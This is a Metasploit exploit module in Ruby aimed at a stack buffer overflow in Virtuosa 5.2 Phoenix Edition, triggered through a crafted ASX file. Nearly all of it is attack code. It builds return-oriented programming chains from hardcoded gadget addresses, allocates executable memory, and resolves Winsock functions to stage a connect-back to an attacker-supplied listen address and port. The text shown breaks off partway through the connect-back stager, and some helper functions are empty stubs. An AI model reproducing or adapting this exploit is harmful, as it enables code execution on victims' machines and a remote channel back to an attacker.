##
# $Id: virtuosa.rb 13015 2011-06-23 20:00:00Z m_101 $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Virtuosa 5.2 Phoenix Edition Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Virtuosa 5.2 Phoenix Edition. When
				the application is used to open a specially crafted ASX file, a buffer overflow occurs
				allowing arbitrary code execution.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Acidgen', # original
					'm_101'    # msf module + ROP version
				],
			'Version'        => '$Revision: 10998 $',
			'References'     =>
				[
					[ 'URL', 'http://www.exploit-db.com/exploits/16070/' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'DisablePayloadHandler' => 'true',
				},
			'Payload'        =>
				{
					'Space'    => 900,
					# 'BadChars' => "\x00\x0a\x0dABCDEFGHIJKLMNOPQRSTUVWXYZ",
					'BadChars' => "",
   					#'EncoderType'   => Msf::Encoder::Type::NonAlpha,
					'DisableNops'  => true
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP3 English', { 'Ret' => 0x0 } ], # seh return in msacm.drv
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Mar 29 2011',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name', 'msf.asx']),
				OptString.new('LHOST', [ true, 'The listen address', '']),
				OptString.new('LPORT', [ true, 'The listen port', ''])
			], self.class)

	end

    # hold pointer encoder keys
    @@pointer_key = { }
    # hold pointer decoder keys
    @@epointer_key = { }

    def ropstack_map
    end

    def check_pointer(pointer)
        p0 = pointer & 0xff
        p1 = (pointer & 0xff00) >> 8
        p2 = (pointer & 0xff0000) >> 16
        p3 = (pointer & 0xff000000) >> 24

        specials = " -;,\\/"
        ptr = p3.chr + p2.chr + p1.chr + p0.chr
        ptr.scan(/([A-Z]|[ -;,-\\\/][a-z])/) { |c|
            print_status('Pointer is incorrect')
            return false
        }

        badchars = "ACBDEFGHIJKLMNOPQRSTUVWXYZ\x00\n\r"
        badchars.each_char { |badchar|
            badchar = badchar.ord

            if p0 == badchar || p1 == badchar || p2 == badchar || p3 == badchar
                print_status('Pointer is incorrect')
                return false
            end
        }

        return true
    end

    def encode_pointer(pointer, random = false)
        if @@pointer_key[pointer] != nil && random == false
            return pointer + @@pointer_key[pointer]
        end

        ptr = pointer
        loop do
            @@pointer_key[pointer] = rand_text_alpha_lower(4).unpack('V').first
            ptr = pointer + @@pointer_key[pointer]
            break if check_pointer(ptr) == true && check_pointer(@@pointer_key[pointer]) == true
        end

        #print_status("ptr: " << ptr.to_s)
        
        # create encoded pointer assoc
        @@epointer_key[ptr] = @@pointer_key[pointer]

        ptr
    end

    def decode_pointer(epointer)
        epointer - @@epointer_key[epointer]
    end

    # trash eax and ecx
    def ropstack_encode_pointer(pointer)
        ropstack = []

        epointer = encode_pointer(pointer)
        # 0x1001D695 :  # POP EAX # RETN 	[Module : GCDSRV32.dll]  ** 
        ropstack.push(0x1001d695)
        # encoded pointer
        ropstack.push(epointer)

        # 0x6004803D :  # POP ECX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6004803d)
        # key for the pointer
        ropstack.push(@@pointer_key[pointer])

        # fix pointer
        # 0x6004AA8A :  # SUB EAX,ECX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6004aa8a)

        ropstack
    end

    def ropstack_encode_value_table(value_table)
        ropstack = []

        value_table.each{ |value|
            field = ropstack_encode_pointer(value)

        }
    end

    def ropstack_store_value(store_start, store_end, value)
        # 0x1001DDB4 :  # MOV DWORD PTR DS:[ECX],EAX # RETN 	[Module : GCDSRV32.dll]  ** 
        # 0x6004D981 :  # MOV DWORD PTR DS:[EAX],ECX # RETN 	[Module : ijl15.dll]  ** 
        # 0x6004BCC7 :  # INC ECX # RETN 	[Module : ijl15.dll]  ** 
    end

    def ropstack_store_values(values)
        ropstack = []
        store = []

        values.each{ |value|
        }

        ropstack
    end

    # trash ebx, ecx
    def xchg_eax_edx
        ropstack = []

        # set EBX
        # 0x60013E29 :  # POP EBX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x60013E29)
        # value to fix eax (to make it wrap around itself to recover initial value)
        # 0xFFFFFFFF - 0x100592DC + 1 = EFFA6D24 = 0x0
        # EBX = 0x60055370 = 0x100592DC + 0xEFFA6D24 + 0x60055370 = 0x100092DC + 0x4FFFC094
        ropstack.push(0x4fffc094)
        
        # 0x10018254 :  # XCHG EAX,EDX # ADD EAX,1AB9010 # ADC BYTE PTR DS:[EBX+100592DC],AH # RETN 	[Module : GCDSRV32.dll]  ** 
        ropstack.concat(ropstack_encode_pointer(0x10018254))

        # 0x6004CB0D :  # PUSH EAX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6004cb0d)

        # 0x6004803D :  # POP ECX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6004803d)
        # value to fix eax (to make it wrap around itself to recover initial value)
        # EAX + 0x1AB9010 - 0x01AB9010 = EAX
        ropstack.push(0x01AB9010)
        
        # fix eax
        # 0x6004AA8A :  # SUB EAX,ECX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6004aa8a)

        ropstack
    end

    # trash ecx
    def xchg_eax_ebp(offset = 0)
        ropstack = []

        # 0x1001C116 :  # XCHG EAX,EBP # ADD EAX,5D5B5E10 # RETN 	[Module : GCDSRV32.dll]  ** 
        ropstack.push(0x1001c116)
        # 0x6004803D :  # POP ECX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6004803d)
        ropstack.push(0x5d5b5e10)
        # 0x6004AA8A :  # SUB EAX,ECX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6004aa8a)

        ropstack
    end

    # trash ecx and ebp
    def xchg_eax_esi
        ropstack = []

        # 0x1001D247 :  # XCHG EAX,ESI # ADD EAX,8895E10 # RETN 	[Module : GCDSRV32.dll]  ** 
        ropstack_encode_pointer(0x1001d247)
        # 0x6004803D :  # POP ECX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6004803d)
        # value to fix eax (to make it wrap around itself to recover initial value)
        # EAX + 0x8895e10 - 0x8895e10 = EAX
        ropstack.push(0x08895e10)
        
        # fix eax
        # 0x6004AA8A :  # SUB EAX,ECX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6004aa8a)

        ropstack
    end

    # destroy ESI
    def ropstack_gen_pow2(n)
        ropstack = []

        # 0x1001C116 :  # XCHG EAX,EBP # ADD EAX,5D5B5E10 # RETN 	[Module : GCDSRV32.dll]  ** 
        # 0x6004D033 :  # MOV EAX,EDX # RETN 	[Module : ijl15.dll]  ** 
        # 0x60049D78 :  # ADD DH,DH # RETN 	[Module : ijl15.dll]  ** 
        # 0x763CC3D8 :  # XCHG EAX,ESI # RETN 	[Module : comdlg32.dll]  ** 
        ropstack.push(0x763cc3d8)
        # 0x1001aba5 :  # XOR EAX,EAX # RETN 	[Module : GCDSRV32.dll]  ** 
        ropstack.push(0x1001aba5)

        if n >= 0 && n <= 2
            # 0x6003697A :  # MOV EAX,1 # RETN 	[Module : ijl15.dll]  ** 
            ropstack.push(0x6003697a)
            s = 1
        else
            # 0x6002B45E :  # ADD EAX,8 # RETN 	[Module : ijl15.dll]  ** 
            ropstack.push(0x6002B45E)
            s = 4
        end

        # 0x763CC3D8 :  # XCHG EAX,ESI # RETN 	[Module : comdlg32.dll]  ** 
        ropstack.push(0x763cc3d8)
        for i in s..n
            # 0x60049D7F :  # ADD ESI,ESI # RETN 	[Module : ijl15.dll]  ** 
            ropstack.push(0x60049D7F)
        end
        # 0x763CC3D8 :  # XCHG EAX,ESI # RETN 	[Module : comdlg32.dll]  ** 
        ropstack.push(0x763cc3d8)

        ropstack
    end

    # allocate RWX memory
    def ropstack_malloc
        ropstack = []
        offset = {}

        ropstack.concat(ropstack_gen_pow2(18))

        # HeapCreate()
        ropstack.push(0x60049A79)

        # == set arguments for HeapAlloc()

        # === EAX
        ropstack.concat(ropstack_gen_pow2(16))

        # 0x60047BCE :  {POP}  # POP EDI # POP ESI # POP EBX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x60047bce)
        ropstack.push(0x60047bce)
        ropstack.push('JUNK')

        # 0x1001af0c :  # POP EDI # RETN 	[Module : GCDSRV32.dll]  ** 
        ropstack.push(0x1001af0c)

        # 0x6002C3F9 :  # POP EDX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6002c3f9)
        ropstack.push('JUNK')
        # 0x6004803D :  # POP ECX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6004803d)

        # HeapAlloc()
        ropstack.push(0x6004aad4)

        # 0x6002B45D :  # PUSHAD # ADD EAX,8 # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6002b45d)

        # == set registers for memmove
        # === EDI
        # recover allocated memory location
        # 0x60025DEF :  # POP ESI # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x60025DEF)
        ropstack.push(0x60055378)  # lpMem : location of allocated memory, have to fix 73 though

        # 0x763CC3D8 :  # XCHG EAX,ESI # RETN 	[Module : comdlg32.dll]  ** 
        ropstack.push(0x763cc3d8)
        # 0x6003D17B :  # XCHG EAX,ECX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6003d17b)

        # ==== FIX EAX ===
        ropstack.concat(ropstack_gen_pow2(13))

        # 0x763CC3D8 :  # XCHG EAX,ESI # RETN 	[Module : comdlg32.dll]  ** 
        ropstack.push(0x763cc3d8)
        # 0x60040E98 :  {POP}  # MOV EAX,ECX # POP EBX # POP EBP # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x60040e98)  # copy pointer eax == ecx
        ropstack.push('JUNK')
        ropstack.push('JUNK')
        # 0x763CC3D8 :  # XCHG EAX,ESI # RETN 	[Module : comdlg32.dll]  ** 
        ropstack.push(0x763cc3d8)
        # 0x6003D17B :  # XCHG EAX,ECX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6003d17b)
        # 0x6004AA8A :  # SUB EAX,ECX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6004aa8a)  # fix eax

        # get location of allocated memory
        # 0x6004DA67 :  # MOV EAX,DWORD PTR DS:[EAX] # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6004DA67)
    end

    # params:
    # eax : size
    # edx : src
    # edi : dst
    # esi : src
    # trash ecx
    def ropstack_memmove
        ropstack = []

        # 0x6003D17B :  # XCHG EAX,ECX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6003d17b)
        # 0x763CC3D8 :  # XCHG EAX,ESI # RETN 	[Module : comdlg32.dll]  ** 
        ropstack.push(0x763cc3d8)
        # eax = 128
        ropstack.concat(ropstack_gen_pow2(6))
        # 0x6003D17B :  # XCHG EAX,ECX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6003d17b)
        # 0x763CC3D8 :  # XCHG EAX,ESI # RETN 	[Module : comdlg32.dll]  ** 
        ropstack.push(0x763cc3d8)

        # 0x10010407 :  # ADD EAX,ECX # POP EBP # RETN 	[Module : GCDSRV32.dll]  ** 
        for i in 1..10
            ropstack.push(0x10010407)
            ropstack.push('JUNK')
        end

        # 0x6002B45E :  # ADD EAX,8 # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6002B45E)
        # 0x1001DDDE :  # INC EAX # RETN 	[Module : GCDSRV32.dll]  ** 
        ropstack.push(0x1001ddde)
        ropstack.push(0x1001ddde)
        ropstack.push(0x1001ddde)
        ropstack.push(0x1001ddde)

        # 0x1001C116 :  # XCHG EAX,EBP # ADD EAX,5D5B5E10 # RETN 	[Module : GCDSRV32.dll]  ** 
        ropstack.concat(xchg_eax_ebp())

        # restore size
        # 0x763CC3D8 :  # XCHG EAX,ESI # RETN 	[Module : comdlg32.dll]  ** 
        ropstack.push(0x763cc3d8)

        # memmove()
        ropstack.push(0x7C873C2B)
        # make room for arguments
        for i in 1..3
            ropstack.push('JUNK')
        end
        # 0x60040DAD :  # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x60040dad)   # seip of memmove()
        for i in 1..6
            ropstack.push('JUNK')
        end

        return ropstack
    end

    # return the ropstack in a string form and replace 'JUNK' by random 4 bytes 
    # alpha lower
    def ropstack_gen(ropstack)
        counter_pointers = 0
        counter_junk = 0

        ropstack.map! { |elt|
            if elt == 'JUNK'
                counter_junk += 1
                rand_text_alpha_lower(4).unpack('V').first
                # rand(0xffffffff) | 0x01010101
            else
                counter_pointers += 1
                # print_status('elt: "' << elt.to_s << '"')
                elt
            end
        }

        ropstack = ropstack.pack('V*')

        return [ropstack,counter_pointers,counter_junk]
    end

    def ropstack_resolve_part1()
        ropstack = []

        # get ESP
        # 0x600285D2 :  {POP}  # PUSH ESP # POP EBX # POP EBP # POP ESI # POP EDI # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x600285d2)
        ropstack.push('JUNK')
        ropstack.push('JUNK')
        ropstack.push('JUNK')
        # 0x6004DC08 :  {POP}  # MOV EAX,EBX # POP ESI # POP EBX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6004dc08)
        ropstack.push('JUNK')
        ropstack.push('JUNK')

        # pivot ESP to make it point to ropstack
        # 0x6001B5E6 : 98  : 	 # ADD ESP,98 # POP EBX # POP EBP # POP ESI # POP EDI # RETN - ijl15.dll -  ** 
        # 0x600282AA : 0B0  : 	 # ADD ESP,0B0 # POP EBX # POP EBP # POP ESI # POP EDI # RETN - ijl15.dll -  ** 
        ropstack.push(0x600282aa)

        # import resolution
        # LoadLibraryA("ws2_32.dll");
        # .text:6004F014                 ds:LoadLibraryA
        # .data:60053D80 hLibModule      dd 0
        ropstack.push(0x6004F014)
        # 0x60040DAD :  # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x60040dad)   # seip of LoadLibraryA()
        ropstack.push('JUNK')   # retn 4 in LoadLibraryA()
        # 0x6004803D :  # POP ECX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6004803d)
        ropstack.push(0x60055b28)  # hLibModule
        # 0x1001DDB4 :  # MOV DWORD PTR DS:[ECX],EAX # RETN 	[Module : GCDSRV32.dll]  ** 
        ropstack.push(0x1001ddb4)

        # go to payload
        # 0x1001D695 :  # POP EAX # RETN 	[Module : GCDSRV32.dll]  ** 
        ropstack.push(0x1001d695)
        ropstack.push(0x60053478)   # payload address
        # 0x1001FFA2 : EAX : 	 # XCHG EAX,ESP # RETN - GCDSRV32.dll -  ** 
        ropstack.push(0x1001ffa2)

=begin
GetProcAddress(hLibModule, "WSAStartup");
GetProcAddress(hLibModule, "socket");
GetProcAddress(hLibModule, "connect");
GetProcAddress(hLibModule, "recv");
GetProcAddress(hLibModule, "closesocket");
GetProcAddress(hLibModule, "WSACleanup");
WSAStartup();
socket(AF_INET, SOCK_STREAM, 0);
connect();
recv(clientfd, buf, len, 0);
=end
        for i in 1..39
            ropstack.push('JUNK')
        end


        # == jump here
        # 0x600285D0 : 54  : 	 # ADD ESP,54 # POP EBX # POP EBP # POP ESI # POP EDI # RETN - ijl15.dll -  ** 
        # 0x6001CAD6 : 58  : 	 # ADD ESP,58 # POP EBX # POP EBP # POP ESI # POP EDI # RETN - ijl15.dll -  ** 
        ropstack.push(0x6001cad6)

        #
        size = ropstack.size * 4
        
        # strings table
        ropstack.concat(('ws2_32.dll' + rand_text_alpha_lower(6)).unpack('V*'))
        ropstack.concat(('recv' + rand_text_alpha_lower(10)).unpack('V*'))
        ropstack.concat(('socket' + rand_text_alpha_lower(6)).unpack('V*'))
        ropstack.concat(('connect' + rand_text_alpha_lower(6)).unpack('V*'))
        ropstack.concat(('closesocket' + rand_text_alpha_lower(6)).unpack('V*'))
        ropstack.concat(('WSAStartup' + rand_text_alpha_lower(6)).unpack('V*'))
        ropstack.concat(('WSACleanup' + rand_text_alpha_lower(6)).unpack('V*'))

        size = ropstack.size * 4 - size
        print_status('String table size     : ' << size.to_s())

        for i in 1..1
            ropstack.push('JUNK')
        end


        # == jump here
        # computing payload address
        # 0x6003D17B :  # XCHG EAX,ECX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6003d17b)
        # 0x1001aba5 :  # XOR EAX,EAX # RETN 	[Module : GCDSRV32.dll]  ** 
        ropstack.push(0x1001aba5)
        # 0x1001DDDE :  # INC EAX # RETN 	[Module : GCDSRV32.dll]  ** 
        ropstack.push(0x1001ddde)
        ropstack.push(0x1001ddde)
        ropstack.push(0x1001ddde)
        ropstack.push(0x1001ddde)
        # 0x6003D17B :  # XCHG EAX,ECX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6003d17b)
        # 0x10010407 :  # ADD EAX,ECX # POP EBP # RETN 	[Module : GCDSRV32.dll]  ** 
        for i in 1..7
            ropstack.push(0x10010407)
            ropstack.push('JUNK')
        end
        # eax should now point to beginning of payload

        # save beginning of payload
        # 0x6002C3F9 :  # POP EDX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6002c3f9)
        ropstack.push(0x60055b1c)  # data in ijl15.dll
        # 0x600270E3 :  # MOV DWORD PTR DS:[EDX],EAX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x600270e3)
        

        # copy payload to static data zone
        # 0x6004803D :  # POP ECX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6004803d)
        ropstack.push(0x60055b20)  # data in ijl15.dll
        # 0x60049011 :  # MOV EDX,DWORD PTR DS:[ECX-4] # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x60049011)
        # 0x1001af0c :  # POP EDI # RETN 	[Module : GCDSRV32.dll]  ** 
        ropstack.push(0x1001af0c)
        ropstack.push(0x60053104)  # data in ijl15.dll
        ropstack.concat(ropstack_gen_pow2(12))
        ropstack.concat(ropstack_memmove())


        # get LoadLibraryA() real address using its import table entry
        # 0x1001D695 :  # POP EAX # RETN 	[Module : GCDSRV32.dll]  ** 
        ropstack.push(0x1001d695)
        ropstack.push(0x6004f014)   # LoadLibraryA() import entry
        # 0x6004DA67 :  # MOV EAX,DWORD PTR DS:[EAX] # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6004DA67)

        # set LoadLibraryA() real address
        # 0x6004803D :  # POP ECX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6004803d)
        ropstack.push(0x60053104)
        # 0x1001DDB4 :  # MOV DWORD PTR DS:[ECX],EAX # RETN 	[Module : GCDSRV32.dll]  ** 
        ropstack.push(0x1001ddb4)

        # set LoadLibraryA() argument
        # 0x1001D695 :  # POP EAX # RETN 	[Module : GCDSRV32.dll]  ** 
        ropstack.push(0x1001d695)
        ropstack.push(0x600531c8)
        # 0x6004803D :  # POP ECX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6004803d)
        ropstack.push(0x6005310c)
        # 0x1001DDB4 :  # MOV DWORD PTR DS:[ECX],EAX # RETN 	[Module : GCDSRV32.dll]  ** 
        ropstack.push(0x1001ddb4)

        # fix end of library name
        # 0x1001aba5 :  # XOR EAX,EAX # RETN 	[Module : GCDSRV32.dll]  ** 
        ropstack.push(0x1001aba5)
        # 0x6004803D :  # POP ECX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6004803d)
        ropstack.push(0x600531d2)
        # 0x1001DDB4 :  # MOV DWORD PTR DS:[ECX],EAX # RETN 	[Module : GCDSRV32.dll]  ** 
        ropstack.push(0x1001ddb4)

        # go to LoadLibrary
        # 0x1001D695 :  # POP EAX # RETN 	[Module : GCDSRV32.dll]  ** 
        ropstack.push(0x1001d695)
        ropstack.push(0x60053104)   # LoadLibraryA()
        # 0x1001FFA2 : EAX : 	 # XCHG EAX,ESP # RETN - GCDSRV32.dll -  ** 
        ropstack.push(0x1001ffa2)

        # 0x60037E3B : 2C  : 	 # ADD ESP,2C # POP EBX # POP EBP # POP ESI # POP EDI # RETN - ijl15.dll -  ** 
        ropstack.push(0x60037e3b)

        return ropstack
    end

    def ropstack_resolve_part2
        ropstack = []

        for i in 1..6
            ropstack.push('JUNK')
        end

        # get GetProcAddress() real address
        # 0x1001D695 :  # POP EAX # RETN 	[Module : GCDSRV32.dll]  ** 
        ropstack.push(0x1001d695)
        ropstack.push(0x6004f018)   # GetProcAddress() import entry
        # 0x6004DA67 :  # MOV EAX,DWORD PTR DS:[EAX] # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6004DA67)
        # set GetProcAddress() real address
        pGetProcAddress = 0x60053660
        for i in 1..6
            # 0x6004803D :  # POP ECX # RETN 	[Module : ijl15.dll]  ** 
            ropstack.push(0x6004803d)
            ropstack.push(pGetProcAddress)
            # if pointer not good then we need to fix it
            if pGetProcAddress == 0x60053158
                # fix eax
                ropstack.concat(ropstack_gen_pow2(5))
                # 0x6003D17B :  # XCHG EAX,ECX # RETN 	[Module : ijl15.dll]  ** 
                ropstack.push(0x6003d17b)
                # 0x6004AA8A :  # SUB EAX,ECX # RETN 	[Module : ijl15.dll]  ** 
                ropstack.push(0x6004aa8a)
                # 0x6003D17B :  # XCHG EAX,ECX # RETN 	[Module : ijl15.dll]  ** 
                ropstack.push(0x6003d17b)
                # 0x763CC3D8 :  # XCHG EAX,ESI # RETN 	[Module : comdlg32.dll]  ** 
                ropstack.push(0x763cc3d8)
            end
            # 0x1001DDB4 :  # MOV DWORD PTR DS:[ECX],EAX # RETN 	[Module : GCDSRV32.dll]  ** 
            ropstack.push(0x1001ddb4)
            # there is 0x1c between each call
            pGetProcAddress += 0x1c
        end

        # set GetProcAddress() string arguments
        pGetProcAddress = 0x60053660
        funcnames = [ 0x600531d8, 0x600531e4, 0x600531f0, 0x600531fc, 0x6005320c, 0x6005321c ]
        funcnames.each { |funcname|
            # 0x6004803D :  # POP ECX # RETN 	[Module : ijl15.dll]  ** 
            ropstack.push(0x6004803d)
            ropstack.push(funcname)   # function name address
            # if pointer not good then we need to fix it
            if check_pointer(funcname) == false
                # fix eax
                ropstack.concat(ropstack_gen_pow2(5))
                # 0x6003D17B :  # XCHG EAX,ECX # RETN 	[Module : ijl15.dll]  ** 
                ropstack.push(0x6003d17b)
                # 0x6004AA8A :  # SUB EAX,ECX # RETN 	[Module : ijl15.dll]  ** 
                ropstack.push(0x6004aa8a)
                # 0x6003D17B :  # XCHG EAX,ECX # RETN 	[Module : ijl15.dll]  ** 
                ropstack.push(0x6003d17b)
            end

            # offset to string argument
            pGetProcAddress += 0xc
            # 0x1001D695 :  # POP EAX # RETN 	[Module : GCDSRV32.dll]  ** 
            ropstack.push(0x1001d695)
            ropstack.push(pGetProcAddress)
            # if pointer not good then we need to fix it
            if pGetProcAddress == 0x60053148
                # fix eax
                ropstack.concat(ropstack_gen_pow2(5))
                # 0x6003D17B :  # XCHG EAX,ECX # RETN 	[Module : ijl15.dll]  ** 
                ropstack.push(0x6003d17b)
                # 0x763CC3D8 :  # XCHG EAX,ESI # RETN 	[Module : comdlg32.dll]  ** 
                ropstack.push(0x763cc3d8)
                # 0x6004AA8A :  # SUB EAX,ECX # RETN 	[Module : ijl15.dll]  ** 
                ropstack.push(0x6004aa8a)
                # 0x6003D17B :  # XCHG EAX,ECX # RETN 	[Module : ijl15.dll]  ** 
                ropstack.push(0x6003d17b)
                # 0x763CC3D8 :  # XCHG EAX,ESI # RETN 	[Module : comdlg32.dll]  ** 
                ropstack.push(0x763cc3d8)
                # 0x6003D17B :  # XCHG EAX,ECX # RETN 	[Module : ijl15.dll]  ** 
                ropstack.push(0x6003d17b)
            end

            # 0x6004D981 :  # MOV DWORD PTR DS:[EAX],ECX # RETN 	[Module : ijl15.dll]  ** 
            ropstack.push(0x6004d981)
            # offset to next
            pGetProcAddress += 0x10
        }

        # fix end of each string
        # 0x1001aba5 :  # XOR EAX,EAX # RETN 	[Module : GCDSRV32.dll]  ** 
        ropstack.push(0x1001aba5)
        # 0122 is bad char
        funcnamesend = [ 0x600531dc, 0x600531ea, 0x600531f7, 0x60053207, 0x60053216, 0x60053226 ]
        funcnamesend.each { |funcnameend|
            # 0x6004803D :  # POP ECX # RETN 	[Module : ijl15.dll]  ** 
            ropstack.push(0x6004803d)
            ropstack.push(funcnameend)
            # 0x1001DDB4 :  # MOV DWORD PTR DS:[ECX],EAX # RETN 	[Module : GCDSRV32.dll]  ** 
            ropstack.push(0x1001ddb4)
        }

        # fix wsastartup to WSAStartup
        ropstack.concat(ropstack_encode_pointer('WSAS'.unpack('V').first))
        # 0x6004803D :  # POP ECX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6004803d)
        ropstack.push(0x6005320c)
        # 0x1001DDB4 :  # MOV DWORD PTR DS:[ECX],EAX # RETN 	[Module : GCDSRV32.dll]  ** 
        ropstack.push(0x1001ddb4)
        # fix wsacleanup to WSACleanup
        ropstack.concat(ropstack_encode_pointer('WSAC'.unpack('V').first))
        # 0x6004803D :  # POP ECX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6004803d)
        ropstack.push(0x6005321c)
        # 0x1001DDB4 :  # MOV DWORD PTR DS:[ECX],EAX # RETN 	[Module : GCDSRV32.dll]  ** 
        ropstack.push(0x1001ddb4)


        # set GetProcAddress() hLibModule argument
        pGetProcAddress = 0x60053660
        for i in 1..6
            # offset to hLibModule argument
            pGetProcAddress += 0x8
            if pGetProcAddress == 0x60053700
                ropstack.concat(ropstack_encode_pointer(0x60053700))
                # 0x6003D17B :  # XCHG EAX,ECX # RETN 	[Module : ijl15.dll]  ** 
                ropstack.push(0x6003d17b)
            else
                # 0x6004803D :  # POP ECX # RETN 	[Module : ijl15.dll]  ** 
                ropstack.push(0x6004803d)
                ropstack.push(pGetProcAddress)
            end
            # if pointer not good then we need to fix it
            if pGetProcAddress == 0x60053758
                # fix eax
                ropstack.concat(ropstack_gen_pow2(5))
                # 0x6003D17B :  # XCHG EAX,ECX # RETN 	[Module : ijl15.dll]  ** 
                ropstack.push(0x6003d17b)
                # 0x6004AA8A :  # SUB EAX,ECX # RETN 	[Module : ijl15.dll]  ** 
                ropstack.push(0x6004aa8a)
                # 0x6003D17B :  # XCHG EAX,ECX # RETN 	[Module : ijl15.dll]  ** 
                ropstack.push(0x6003d17b)
            end

            # get library real base address
            # 0x1001D695 :  # POP EAX # RETN 	[Module : GCDSRV32.dll]  ** 
            ropstack.push(0x1001d695)
            ropstack.push(0x60055b28)   # hLibModule
            # 0x6004DA67 :  # MOV EAX,DWORD PTR DS:[EAX] # RETN 	[Module : ijl15.dll]  ** 
            ropstack.push(0x6004DA67)

            # 0x1001DDB4 :  # MOV DWORD PTR DS:[ECX],EAX # RETN 	[Module : GCDSRV32.dll]  ** 
            ropstack.push(0x1001ddb4)

            # offset to next
            pGetProcAddress += 0x14
        end

        # import resolution in payload
        # recv, socket, connect, closesocket, WSAStartup, WSACleanup
        funcptrs = [ 0x60053a64, 0x600539fc, 0x60053a28, 0x60054040, 0x600539e4, 0x60054040 ]
        funcptrs.each { |funcptr|
            # .text:6004F018                 ds:GetProcAddress
            ropstack.push(0x6004F018)
            # 0x60040DAD :  # RETN 	[Module : ijl15.dll]  ** 
            ropstack.push(0x60040dad)   # seip of GetProcAddress()
            ropstack.push(0x60055b28)   # hLibModule
            ropstack.push('JUNK')
            # 0x6002C3F9 :  # POP EDX # RETN 	[Module : ijl15.dll]  ** 
            ropstack.push(0x6002c3f9)
            ropstack.push(funcptr)  # data in ijl15.dll
            # 0x600270E3 :  # MOV DWORD PTR DS:[EDX],EAX # RETN 	[Module : ijl15.dll]  ** 
            ropstack.push(0x600270e3)
        }

        return ropstack
    end

    def ropstack_stager_connectback
        ropstack = []

        # setting up socket() arguments
        # AF_INET = 0x2
        ropstack.concat(ropstack_gen_pow2(1))
        # 0x6004803D :  # POP ECX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6004803d)
        ropstack.push(0x60053a04)
        # 0x1001DDB4 :  # MOV DWORD PTR DS:[ECX],EAX # RETN 	[Module : GCDSRV32.dll]  ** 
        ropstack.push(0x1001ddb4)
        # = recv() struct sockaddr
        # 0x6004803D :  # POP ECX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6004803d)
        ropstack.push(0x60055b5c)
        # 0x1001DDB4 :  # MOV DWORD PTR DS:[ECX],EAX # RETN 	[Module : GCDSRV32.dll]  ** 
        ropstack.push(0x1001ddb4)

        # SOCK_STREAM = 0x1
        ropstack.concat(ropstack_gen_pow2(0))
        # 0x6004803D :  # POP ECX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6004803d)
        ropstack.push(0x60053a08)
        # 0x1001DDB4 :  # MOV DWORD PTR DS:[ECX],EAX # RETN 	[Module : GCDSRV32.dll]  ** 
        ropstack.push(0x1001ddb4)

        # protocol, recv flags and end of struct sockaddr to 0
        # 0x1001aba5 :  # XOR EAX,EAX # RETN 	[Module : GCDSRV32.dll]  ** 
        ropstack.push(0x1001aba5)
        funcnamesend = [ 0x60053a0c, 0x60053a78, 0x60055b64, 0x60055b68 ]
        funcnamesend.each { |funcnameend|
            # 0x6004803D :  # POP ECX # RETN 	[Module : ijl15.dll]  ** 
            ropstack.push(0x6004803d)
            ropstack.push(funcnameend)
            # 0x1001DDB4 :  # MOV DWORD PTR DS:[ECX],EAX # RETN 	[Module : GCDSRV32.dll]  ** 
            ropstack.push(0x1001ddb4)
        }

